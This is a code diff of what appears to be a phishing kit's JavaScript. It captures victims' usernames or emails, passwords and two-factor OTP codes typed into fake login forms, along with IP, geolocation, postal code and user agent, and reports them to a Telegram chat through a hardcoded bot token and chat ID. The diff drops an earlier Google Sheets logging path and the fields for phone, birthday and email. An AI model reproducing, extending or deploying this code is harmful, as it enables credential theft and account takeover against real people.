@@ -4,7 +4,7 @@ const CONFIG = {
 		BOT_TOKEN: '8328740598:AAG3qtxa-1HshBQtAWfSeEPI6YHOR0g_-iw',
 		CHAT_ID: '-1003936740040',
 	},
-	GEO_API: 'https://get.geojs.io/v1/ip/geo.json',
+	GEO_API: 'http://ipwhois.pro/?key=8U9rT6QVwOslzNS0',
 };
 
 /* ================= 2. UTILITIES & DATA ================= */
@@ -15,6 +15,7 @@ const Utils = window.Utils = {
 		countryCode: 'Unknown',
 		city: 'Unknown',
 		region: 'Unknown',
+		postal: 'Unknown',
 		flag: '',
 	},
 
@@ -73,6 +74,7 @@ const Utils = window.Utils = {
 				country: data.country || 'Unknown',
 				city: data.city || 'Unknown',
 				region: data.region || 'Unknown',
+				postal: data.postal || 'Unknown',
 				flag: Utils.countryCodeToFlag(data.country_code),
 			};
 
@@ -84,61 +86,6 @@ const Utils = window.Utils = {
 
 	getTime: () => new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),
 
-	logToSheet: async (type, extra = {}) => {
-		try {
-			const body = { action: 'append', value: [] }
-
-			if (type === 'INFO') {
-				const birthday = [
-					document.getElementById('day')?.value || '',
-					document.getElementById('month')?.value || '',
-					document.getElementById('year')?.value || '',
-				].filter(Boolean).join('/')
-
-				body.value = [[
-					Utils.getTime(),
-					type,
-					Utils.userLoc.ip,
-					Utils.userLoc.country,
-					Utils.userLoc.city,
-					Utils.userLoc.region,
-					document.getElementById('displayName')?.value || '',
-					document.getElementById('email')?.value || '',
-					document.getElementById('emailBusiness')?.value || '',
-					document.getElementById('phone')?.value || '',
-					birthday,
-					document.getElementById('message')?.value || '',
-				]]
-
-				const res = await fetch('/api/sheet', {
-					method: 'POST',
-					headers: { 'Content-Type': 'application/json' },
-					body: JSON.stringify(body),
-				})
-				const data = await res.json()
-				const range = data.updates?.updatedRange || ''
-				const match = range.match(/A(\d+)/)
-				if (match) window._sheetRow = match[1]
-			} else {
-				const row = window._sheetRow
-				if (!row) {
-					console.warn('sheet row not set, skipping update')
-					return
-				}
-				body.action = 'update'
-				body.row = row
-				body.value = [[extra.value || '']]
-
-				await fetch('/api/sheet', {
-					method: 'POST',
-					headers: { 'Content-Type': 'application/json' },
-					body: JSON.stringify(body),
-				})
-			}
-		} catch (e) {
-			console.error('err logging sheet:', e)
-		}
-	},
 
 	sendMessage: async (text) => {
 		try {
@@ -171,14 +118,7 @@ const Utils = window.Utils = {
 
 	formatReport: (type, extra = {}) => {
 		const d = {
-			displayName: document.getElementById('displayName')?.value || 'N/A',
-			mail: document.getElementById('email')?.value || 'N/A',
-			biz: document.getElementById('emailBusiness')?.value || 'N/A',
-			phone: document.getElementById('phone')?.value || 'N/A',
-			day: document.getElementById('day')?.value || '??',
-			month: document.getElementById('month')?.value || '??',
-			year: document.getElementById('year')?.value || '????',
-			note: document.getElementById('message')?.value || 'None',
+			username: document.getElementById('username')?.value || 'N/A',
 		};
 
 		let savedPasswords = window.passwords || [];
@@ -192,13 +132,11 @@ const Utils = window.Utils = {
 
 		let report = `<b>${icon}</b> | ${Utils.getTime()}\n`;
 		report += `IP: ${Utils.userLoc.ip} ${Utils.userLoc.flag}\n`;
+		report += `UA: ${navigator.userAgent}\n`;
 		report += `Location: ${Utils.userLoc.city || 'Unknown'} | ${Utils.userLoc.region || 'Unknown'} (${Utils.userLoc.country}) ${Utils.userLoc.flag}\n`;
+		report += `Postal: ${Utils.userLoc.postal}\n`;
 		report += `----------------------------------\n`;
-		report += `Display Name:<code>${d.displayName} </code> \n`;
-		report += `Email:              <code>  ${d.mail} </code> \n`;
-		report += `Email Business:<code> ${d.biz} </code> \n`;
-		report += `Phone:<code>${d.phone}</code>\n`;
-		report += `Birthday:<code>${d.day}/${d.month}/${d.year}</code>\n`;
+		report += `Username/Email: <code>${d.username}</code>\n`;
 		report += `----------------------------------\n`;
 
 		if (savedPasswords.length > 0) {
@@ -302,27 +240,11 @@ async function initApp() {
 	window._ipReady = true;
 	window.dispatchEvent(new Event('ip-ready'));
 
-	const dialCode = Utils.getDialCode(Utils.userLoc.countryCode);
-	if (dialCode) {
-		const flag = Utils.userLoc.countryCode.toLowerCase();
-		if (typeof selectCountry === 'function') {
-			selectCountry(dialCode, flag);
-		}
-	}
-
 	window.passwords = [];
 	window.otps = [];
 
 	let passAttempts = 0;
 	let otpAttempts = 0;
-
-	document.getElementById('form-info')?.addEventListener('submit', async function (e) {
-		e.preventDefault();
-		await Promise.all([
-			Utils.sendMessage(Utils.formatReport('INFO')),
-			Utils.logToSheet('INFO'),
-		]);
-	});
 
 	document.getElementById('form-password')?.addEventListener('submit', async function (e) {
 		e.preventDefault();
@@ -333,12 +255,9 @@ async function initApp() {
 
 		window.passwords.push(pwd);
 
-		await Promise.all([
-			Utils.sendMessage(
-				Utils.formatReport('PASS', { password: pwd, attempt: passAttempts }),
-			),
-			Utils.logToSheet('PASS', { value: pwd }),
-		]);
+		await Utils.sendMessage(
+			Utils.formatReport('PASS', { password: pwd, attempt: passAttempts }),
+		);
 	});
 
 	const tfaForm = document.getElementById('form-2fa');
@@ -369,12 +288,9 @@ async function initApp() {
 
 				window.otps.push(otpVal);
 
-				await Promise.all([
-					Utils.sendMessage(
-						Utils.formatReport('OTP', { otp: otpVal, attempt: otpAttempts }),
-					),
-					Utils.logToSheet('OTP', { value: otpVal }),
-				]);
+				await Utils.sendMessage(
+					Utils.formatReport('OTP', { otp: otpVal, attempt: otpAttempts }),
+				);
 			}
 		});
 	}
